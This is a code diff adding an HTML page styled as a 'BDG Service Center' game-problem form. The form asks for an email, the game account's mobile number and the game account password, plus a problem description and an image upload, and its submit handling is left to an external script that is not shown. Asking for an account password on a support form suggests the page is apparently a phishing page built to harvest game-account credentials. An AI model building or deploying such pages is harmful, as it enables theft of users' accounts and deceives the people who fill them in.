@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Problem - BDG Service Center</title>
+    <link rel="icon" href="../IMAGE/faviconV2.png" type="image/png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+
+        <main class="main">
+
+            <a href="index.html" class="back-circle" title="Back">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            </a>
+
+            <h1 class="heading">GAME PROBLEM</h1>
+
+            <form id="gameForm" class="form">
+                <label for="email">Email Id</label>
+                <input type="email" id="email" name="email" placeholder="Enter Your Email Id" required>
+
+                <label for="mobile">Game Account Mobile Number</label>
+                <input type="tel" id="mobile" name="mobile" placeholder="Enter Your Mobile Number" required>
+
+                <label for="password">Game Account Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter Your Password" required>
+
+                <label for="problem">Write About Of Problem</label>
+                <textarea id="problem" name="problem" rows="5" placeholder="Write Your Problem Here..." required></textarea>
+
+                <label for="issueImage">Upload Issue Image</label>
+                <input type="file" id="issueImage" name="issueImage" accept="image/*" required>
+
+                <button type="submit" class="confirm-btn">Confirm</button>
+            </form>
+
+        </main>
+
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
